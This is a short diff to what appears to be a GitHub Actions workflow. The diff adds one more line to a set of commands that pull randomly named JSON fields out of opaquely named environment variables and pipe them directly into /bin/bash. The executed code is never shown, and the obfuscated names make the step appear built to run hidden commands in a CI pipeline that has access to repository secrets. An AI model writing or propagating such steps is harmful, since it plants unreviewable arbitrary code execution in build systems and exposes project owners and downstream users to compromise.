@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$gbj224" | jq -r .zae488 | /bin/bash
           printf '%s' "$g1513" | jq -r .hpjge58799 | /bin/bash
           echo $rjxb1 | jq -r .z393 | /bin/bash
+          printf '%s' "$bojh01" | jq -r .ryw26 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
